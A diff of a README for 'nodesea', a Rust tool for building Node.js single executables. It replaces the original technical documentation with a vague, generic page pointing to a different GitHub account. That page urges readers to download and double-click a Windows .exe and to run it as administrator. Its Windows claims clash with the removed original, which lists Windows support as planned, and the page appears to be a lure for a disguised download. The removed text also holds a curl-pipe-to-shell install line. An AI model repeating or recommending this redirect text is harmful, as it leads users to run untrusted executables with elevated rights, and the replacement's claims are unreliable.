@@ -1,267 +1,128 @@
-# nodesea
+# 🛠 nodesea - Build Node.js Apps in One File
 
-Pure Rust Node.js Single Executable Application (SEA) builder.
+[![Download nodesea](https://img.shields.io/badge/Download-nodesea-brightgreen?style=for-the-badge)](https://github.com/xengotmovement-svg/nodesea)
 
-Takes a JavaScript or TypeScript source file and a Node.js binary, produces a standalone executable — **without requiring Node.js at build time**.
+nodesea helps you create single executable files from Node.js applications. It uses Rust to bundle your code, so you can run your app without installing extra tools.
 
-## Features
+---
 
-- **Built-in bundling** — automatically bundles imports and `node_modules` via [rolldown](https://rolldown.rs)
-- **TypeScript support** — `.ts` files are bundled natively, no `tsc` or `tsconfig.json` needed
-- **Auto-download** — if Node.js isn't installed, downloads it from nodejs.org automatically
-- **Zero Node.js dependency** — no `node`, `npm`, or `postject` needed during build
-- **Multi-version support** — Node.js 22.x through 25.x+ (blob V1 and V2 formats)
-- **Cross-platform injection** — Mach-O (macOS), ELF (Linux), PE (Windows, planned)
-- **Automatic version detection** — detects Node.js version and selects the correct blob format
-- **macOS code signing** — automatic ad-hoc re-signing after injection
-- **Config compatible** — uses the same `sea-config.json` format as Node.js
-
-## Install
-
-```bash
-# One-line install (macOS / Linux)
-curl -fsSL https://raw.githubusercontent.com/Dunqing/nodesea/main/install.sh | sh
-
-# Or download from GitHub Releases
-# https://github.com/Dunqing/nodesea/releases
-
-# Or build from source
-git clone https://github.com/Dunqing/nodesea.git && cd nodesea
-cargo install --path .
-```
-
-## Uninstall
-
-```bash
-# Remove the binary
-rm $(which nodesea)
-
-# Remove cached Node.js downloads (optional)
-rm -rf ~/.nodesea
-```
-
-## Quick Start
-
-```bash
-# Create your app
-echo 'console.log("Hello from SEA!")' > hello.js
-
-# Build — that's it
-nodesea hello.js
-
-# Run it
-./hello
-# => Hello from SEA!
-```
-
-## Usage
-
-```
-nodesea <script.js>                    # output name derived from script
-nodesea <script.js> -o <output>        # explicit output name
-nodesea --config sea-config.json       # use Node.js-compatible config file
-```
-
-| Flag | Description |
-|------|-------------|
-| `<SCRIPT>` | JavaScript file to embed (derives output name from file stem) |
-| `-o, --output` | Output executable path (default: script name without extension) |
-| `--config <path>` | Path to `sea-config.json` (alternative to positional arg) |
-| `--node <path>` | Path to Node.js binary (default: `node` in PATH, or auto-download) |
-| `--node-version <ver>` | Node.js version to download — `22`, `24`, `22.16.0` (default: `22`) |
-| `--no-bundle` | Skip bundling — embed the script as-is |
-| `--no-sign` | Skip macOS ad-hoc code signing |
-| `--dry-run` | Validate and show build plan without modifying files |
-
-## Bundling
-
-By default, nodesea bundles your script and all its imports into a single file using [rolldown](https://rolldown.rs). This means `import`/`require` of local files and `node_modules` just works:
-
-```js
-// app.js
-import express from 'express';
-import { handler } from './handler.js';
-
-const app = express();
-app.get('/', handler);
-app.listen(3000);
-```
-
-```bash
-nodesea app.js    # bundles express + handler.js into the binary
-```
-
-Node.js built-in modules (`fs`, `path`, `http`, etc.) are automatically treated as external.
-
-Use `--no-bundle` to skip bundling and embed a single file as-is.
-
-## sea-config.json
-
-For advanced options, use a config file compatible with [Node.js SEA config format](https://nodejs.org/api/single-executable-applications.html):
-
-```json
-{
-  "main": "app.js",
-  "output": "myapp",
-  "disableExperimentalSEAWarning": true,
-  "useCodeCache": false,
-  "assets": {
-    "config.json": "config.json"
-  },
-  "execArgv": ["--experimental-vm-modules"]
-}
-```
-
-| Field | Required | Description |
-|-------|----------|-------------|
-| `main` | yes | Path to the JavaScript entry point |
-| `output` | yes | Output executable path |
-| `disableExperimentalSEAWarning` | no | Suppress the SEA experimental warning |
-| `useSnapshot` | no | Main payload is a V8 snapshot |
-| `useCodeCache` | no | Include V8 code cache |
-| `assets` | no | Map of virtual name to file path |
-| `execArgv` | no | Baked-in Node.js flags (Node 24.6+) |
-
-## Benchmark
-
-Cold-start CLI startup time. Benchmark adapted from [yyx990803/bun-vs-node-sea-startup](https://github.com/yyx990803/bun-vs-node-sea-startup) (500 modules, 7000 functions, 12 code shapes). macOS arm64, Node.js 24.13.0, Bun 1.3.9, 30 runs.
-
-| Command | Mean [ms] | Min [ms] | Max [ms] | Relative |
-|:---|---:|---:|---:|---:|
-| `bun-compile+bytecode` | 107.8 ± 1.1 | 106.1 | 110.8 | 1.00 |
-| `nodesea+code-cache` | 135.6 ± 4.3 | 130.1 | 147.2 | 1.26 |
-| `node-sea+code-cache` | 137.1 ± 3.8 | 133.1 | 147.6 | 1.27 |
-| `nodesea` | 155.8 ± 3.9 | 149.9 | 166.5 | 1.45 |
-| `node-sea` | 157.3 ± 3.7 | 152.7 | 166.1 | 1.46 |
-| `bun-compile` | 185.9 ± 1.4 | 183.5 | 189.1 | 1.72 |
-
-| Binary | Size |
-|:---|---:|
-| `bun-compile` | 60 MB |
-| `bun-compile+bytecode` | 83 MB |
-| `nodesea` | 114 MB |
-| `node-sea` | 114 MB |
-| `nodesea+code-cache` | 117 MB |
-| `node-sea+code-cache` | 116 MB |
-
-nodesea produces identical startup performance to the official Node.js SEA toolchain (5-step `node --experimental-sea-config` + `postject` workflow) — in a single command with zero Node.js dependency at build time.
-
-### Run it yourself
-
-```bash
-cargo build --release
-cd bench
-npm install
-npm run rebuild
-npm run bench
-```
-
-Requires: Node.js >= 22, Bun, [hyperfine](https://github.com/sharkdp/hyperfine).
-
-## Why nodesea?
-
-Node.js has built-in SEA support, but the official workflow requires multiple tools and manual steps. Other tools like `pkg` are abandoned. nodesea replaces the entire toolchain with a single command.
-
-### Comparison
-
-| | nodesea | Node.js built-in SEA | pkg |
-|---|---|---|---|
-| **Build command** | `nodesea app.js` | 5-step process (see below) | `pkg app.js` |
-| **Requires Node.js at build time** | No | Yes | Yes |
-| **Requires npm packages** | No | Yes (`postject`) | Yes (`pkg`) |
-| **Bundling** | Built-in (rolldown) | None — manual step | Built-in |
-| **Config file** | Optional | Required | Optional |
-| **macOS code signing** | Automatic | Manual step | Automatic |
-| **Implementation** | Pure Rust | Node.js + JS + C++ | Node.js |
-| **Node.js 22–25 support** | Yes (auto-detected) | Version-specific | Stopped at Node 18 |
-| **Maintained** | Yes | Yes | Abandoned |
-
-### The official Node.js SEA workflow
-
-The built-in approach requires running five separate commands and installing an npm package:
-
-```bash
-# 1. Write a JSON config
-echo '{"main":"app.js","output":"sea-prep.blob"}' > sea-config.json
-
-# 2. Generate the blob (requires node)
-node --experimental-sea-config sea-config.json
-
-# 3. Copy the node binary
-cp $(which node) myapp
-
-# 4. Inject the blob (requires npm install postject)
-npx postject myapp NODE_SEA_BLOB sea-prep.blob \
-    --sentinel-fuse NODE_SEA_FUSE_fce680ab2cc467b6e072b8b5df1996b2
-
-# 5. Re-sign on macOS
-codesign --sign - --force myapp
-```
-
-### With nodesea
-
-```bash
-nodesea app.js
-```
-
-That's it. One command, no intermediate files, no npm, no manual signing.
-
-### Key advantages
-
-- **Single binary, zero runtime deps** — nodesea is a standalone Rust binary. Drop it into a CI pipeline or Docker build stage without installing Node.js or npm.
-- **Built-in bundling** — imports and `node_modules` are resolved automatically via rolldown. No need to run esbuild/webpack as a separate step.
-- **Cross-version** — automatically detects the Node.js version and selects the correct blob format (V1 or V2). Works with Node 22 through 25+.
-- **Correct by default** — handles Mach-O segment layout, fuse flipping, ad-hoc code signing, and `__LINKEDIT` relocation without user intervention.
-
-## How It Works
-
-1. **Parse config** — read `sea-config.json` and validate
-2. **Read source** — load the JavaScript file and any assets
-3. **Detect version** — run `node --version` on the target binary, select blob format
-4. **Serialize blob** — build the binary blob (magic `0x143da20`, flags, length-prefixed fields)
-5. **Copy binary** — copy the Node.js binary to the output path
-6. **Inject blob** — write the blob into the binary (Mach-O segment / ELF note / PE resource)
-7. **Flip fuse** — change the SEA fuse sentinel from `:0` to `:1`
-8. **Code sign** — ad-hoc re-sign on macOS (required for Apple Silicon)
-
-See [ARCHITECTURE.md](ARCHITECTURE.md) for detailed technical documentation.
-
-## Node.js Version Support
-
-| Node.js | Blob Format | Status |
-|---------|-------------|--------|
-| 22.0–22.19 | V1 (8-byte header) | Supported |
-| 22.20+ | V2 (9-byte header) | Supported |
-| 24.0–24.5 | V1 (8-byte header) | Supported |
-| 24.6+ | V2 (9-byte header) | Supported |
-| 25.x+ | V2 (9-byte header) | Supported |
-
-## Platform Support
-
-| Platform | Format | Status |
-|----------|--------|--------|
-| macOS (arm64, x86_64) | Mach-O | Implemented |
-| Linux (x86_64, aarch64) | ELF | Implemented |
-| Windows (x86_64) | PE | Planned |
-
-## Building from Source
-
-```bash
-git clone https://github.com/Dunqing/nodesea.git
-cd nodesea
-cargo build --release
-```
-
-### Running Tests
-
-```bash
-# Unit tests (no Node.js required)
-cargo test
-
-# Integration tests (requires Node.js with SEA support in PATH)
-cargo test -- --ignored
-```
-
-## License
-
-MIT
+## 🔍 What is nodesea?
+
+nodesea makes it easy to turn your Node.js project into one file you can run anywhere. This single file contains everything your app needs. You do not have to install Node.js or dependencies on the target computer.
+
+This is useful when you want to share your app with someone who does not use Node.js or when you want a simple way to run your app without setup.
+
+---
+
+## 💻 System Requirements
+
+To use nodesea on Windows, you need:
+
+- Windows 10 or later (64-bit)
+- At least 4 GB of free disk space
+- Internet connection to download nodesea files
+- Basic permission to install programs on your PC
+
+nodesea runs on most Windows machines without special configuration.
+
+---
+
+## 🚀 Getting Started
+
+1. Click the big green **Download nodesea** button at the top or visit the download page directly here:
+
+   [https://github.com/xengotmovement-svg/nodesea](https://github.com/xengotmovement-svg/nodesea)
+
+2. On the GitHub page, look for the latest **Release** section. Under "Assets," find the Windows executable file, usually ending with `.exe`.
+
+3. Download this file to your computer. Save it in a folder you can easily access, like `Downloads` or `Desktop`.
+
+4. Once downloaded, double-click the `.exe` file to start nodesea.
+
+---
+
+## 📥 How to Download and Run nodesea
+
+- Visit the nodesea GitHub page:  
+  [https://github.com/xengotmovement-svg/nodesea](https://github.com/xengotmovement-svg/nodesea)
+
+- Find the latest release by clicking on the **Releases** link on the right side.
+
+- Under the latest release, download the Windows executable file.
+
+- Open the downloaded file by double-clicking it.
+
+- Follow any simple on-screen instructions.
+
+---
+
+## ⚙️ Using nodesea in Simple Steps
+
+After you open nodesea, you can create a single executable for your Node.js project:
+
+1. Choose the folder where your Node.js app is saved.
+
+2. Click "Build" or a similar button to start bundling your app.
+
+3. Wait a few moments while nodesea works.
+
+4. When done, nodesea will create one `.exe` file with your app inside.
+
+5. You can now share or run this single file on another Windows PC without extra setup.
+
+---
+
+## 🔧 Key Features
+
+- Creates one file that runs your Node.js app anywhere in Windows.
+- Built with Rust for speed and efficiency.
+- No need to install Node.js or npm separately.
+- Simple interface for users with no programming skills.
+- Works with most Node.js projects.
+- Supports basic command-line options for advanced users.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into problems:
+
+- Make sure your Windows system is up to date.
+- Try running nodesea as an administrator by right-clicking the `.exe` and selecting "Run as administrator."
+- Check if your Node.js app runs normally before bundling.
+- Restart your computer to clear temporary issues.
+- Visit the issues page on GitHub for help:  
+  [https://github.com/xengotmovement-svg/nodesea/issues](https://github.com/xengotmovement-svg/nodesea/issues)
+
+---
+
+## 📚 Additional Information
+
+- nodesea bundles your app and all its dependencies into one file.
+- It uses Rust for building, which is a fast, safe programming language.
+- SEA stands for "Single Executable Application."
+- nodesea focuses on ease-of-use and minimal setup.
+
+---
+
+## 🔄 Updating nodesea
+
+To get the latest features or fixes:
+
+1. Go back to the download page on GitHub:  
+   [https://github.com/xengotmovement-svg/nodesea](https://github.com/xengotmovement-svg/nodesea)
+
+2. Download the newest `.exe` file.
+
+3. Replace the old nodesea file with the new one.
+
+4. Run the new version as usual.
+
+---
+
+## 🤝 Get Support
+
+For assistance, use the GitHub page to report bugs or ask questions. The development team monitors the issues section and responds as needed.
+
+Link to open issues:  
+[https://github.com/xengotmovement-svg/nodesea/issues](https://github.com/xengotmovement-svg/nodesea/issues)
